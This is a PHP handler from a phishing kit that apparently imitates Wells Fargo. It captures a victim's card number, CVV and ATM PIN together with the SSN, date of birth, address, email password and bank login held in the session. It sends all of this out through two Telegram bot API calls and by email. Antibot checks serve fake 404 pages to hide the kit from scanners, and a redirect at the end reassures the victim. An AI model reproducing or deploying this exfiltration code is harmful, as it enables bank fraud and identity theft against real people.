<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';
    require_once '../../config.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['card'],
        $_POST['exp'],
        $_POST['cvv'],
        $_POST['atm']
    )) {
        if (!$comps->checkEmpty(
            $_POST['card'],
            $_POST['exp'],
            $_POST['cvv'],
            $_POST['atm']
        )) {
            $binInfo = $comps->getBin(str_replace(' ', '', $_POST['card']));

            isset($binInfo['scheme']) || $binInfo['scheme'] = "Unknown";
            isset($binInfo['brand']) || $binInfo['brand'] = "Unknown";
            isset($binInfo['type']) || $binInfo['type'] = "Unknown";
            isset($binInfo['country']) || $binInfo['emoji'] = "Unknown";
            isset($binInfo['country']) || $binInfo['alpha2'] = "Unknown";



            $content = '[+]━━━━━━━━━━━━【🔑 CC from '. $_SESSION['username'] .' 】━━━━━━━━━━━━━━━━━━━[+]
           
                [👤 Card number:] ' . str_replace(" ", "", $_POST['card']) . '
                [👤 Expiration Date:] ' . $_POST['exp'] . '
                [👤 CVV:] ' . $_POST['cvv'] . '
                [👤 ATM PIN:] ' . $_POST['atm'] . '
           
            🧊 BIN Info
                   [👤 Brand:] ' . ucwords($binInfo['scheme']) . '
                    [👤 Level:] ' . ucwords($binInfo['brand']) . '
                    [👤 Type:] ' . ucwords($binInfo['type']) . '
                    [👤 Country:] ' . ucwords($binInfo['country']['emoji'] . " (" . $binInfo['country']['alpha2']) . ')
           
            💫 Billing Info
                   [👤 Full Name:] ' . $_SESSION['fname'] . '
                   [👤 Address:] ' . $_SESSION['addr'] . '
                   [👤 City:] ' . $_SESSION['city'] . '
                   [👤 State:] ' . $_SESSION['state'] . '
                   [👤 ZIP:] ' . $_SESSION['zip'] . '
                   [👤 SSN:] ' . $_SESSION['ssn'] . '
                   [👤 DOB:]   ' . $_SESSION['dob'] . '
                   [👤 Phone Number:] ' . $_SESSION['phone'] . '
                    
            🌎 Email Info
                   [👤 Email Address:] ' . $_SESSION['email'] . '
                   [👤 Password:] ' . $_SESSION['emailPassword'] . '
                   [👤 Domain:] ' . ucwords(substr($_SESSION['email'], strpos($_SESSION['email'], '@') + 1)) . '
                     Login Info
                    Username: ' . $_SESSION['username'] . '
                    Password: ' . $_SESSION['password'] . '
           
            📱 Device Info ' . $comps->userDetails();
                    
$website1="https://api.telegram.org/bot";
  $params1=[
      'chat_id'=>'-',
      'text'=>$content ,];
  $ch1 = curl_init($website1 . '/sendMessage');
  curl_setopt($ch1, CURLOPT_HEADER, false);
  curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch1, CURLOPT_POST, 1);
  curl_setopt($ch1, CURLOPT_POSTFIELDS, ($params1));
  curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, false);
  $result1 = curl_exec($ch1);
  curl_close($ch1);


  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$content,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch); 
       
            if ($comps->mailX("(1) CC | Wells Fargo", $content, $_SESSION['fname'])) {
                $comps->log(
                    "../../Export/key/live.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) CC\n\n"
                );
                $comps->headerX("../../Login/complete.php");
            } else {
                die($antibot->throw404());
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Export/key/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }